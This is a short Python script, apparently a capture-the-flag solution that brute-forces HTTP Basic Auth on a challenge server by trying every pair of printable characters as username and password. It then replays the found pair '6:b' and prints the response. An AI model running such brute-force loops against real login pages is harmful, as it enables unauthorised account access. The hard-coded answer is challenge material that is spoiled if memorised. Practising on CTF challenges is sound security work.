import requests
import base64
import string
from tqdm import tqdm

# l = [chr(_) for _ in range(0x20, 0x7f)]
# for i in tqdm(l):
#     for j in l:
#         # print(f"{i}:{j}")
#         b = f"{i}:{j}".encode()
#         pl = f"Basic {base64.b64encode(b).decode()}"
#         # print(f"pl: {pl}")
#         r = requests.get('http://challs.nusgreyhats.org:32905/',headers={'Authorization': pl})
#         # print(r)
#         # print(r.status_code)
#         # print(r.text)
#         if r.status_code == 200:
#             print(f"found b64 key: {b}")

i = "6"
j = "b"
b = f"{i}:{j}".encode()
pl = f"Basic {base64.b64encode(b).decode()}"
# print(f"pl: {pl}")
r = requests.get('http://challs.nusgreyhats.org:32905/',headers={'Authorization': pl})
# print(r)
# print(r.status_code)
# print(r.text)
if r.status_code == 200:
    print(f"found b64 key: {b}")
    print(r.text)